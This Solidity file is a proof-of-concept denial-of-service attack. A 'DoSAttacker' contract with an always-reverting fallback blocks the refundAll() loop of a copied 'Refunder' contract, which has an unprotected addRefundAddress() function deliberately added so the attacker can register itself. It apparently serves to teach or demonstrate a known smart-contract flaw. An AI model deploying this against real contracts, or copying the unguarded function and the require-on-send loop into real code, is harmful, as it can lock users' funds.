pragma solidity 0.4.24;

// Attacker contract that causes refundAll() to fail
contract DoSAttacker {
    // Fallback function that always reverts — .send() will fail
    function () external payable {
        revert("No Ether accepted");
    }

    // Optional: attacker receives a refund value from Refunder
    function registerAttack(Refunder target) public {
        // Assuming attacker can interact with the Refunder to add itself
        // Not possible in the given code, but included for exploit demonstration
        // Normally you'd need a function like `addRefundAddress(address)`
    }
}

// Target contract copied for context (assumed to be already deployed)
contract Refunder {
    address[] public refundAddresses;
    mapping (address => uint) public refunds;

    constructor() public {
        refundAddresses.push(0x79B483371E87d664cd39491b5F06250165e4b184);
        refundAddresses.push(0x79B483371E87d664cd39491b5F06250165e4b185);
    }

    function refundAll() public {
        for (uint x = 0; x < refundAddresses.length; x++) {
            require(refundAddresses[x].send(refunds[refundAddresses[x]]));
        }
    }

    // Function that allows attacker to inject itself — assumed insecure addition
    function addRefundAddress(address _addr, uint amount) public {
        refundAddresses.push(_addr);
        refunds[_addr] = amount;
    }
}

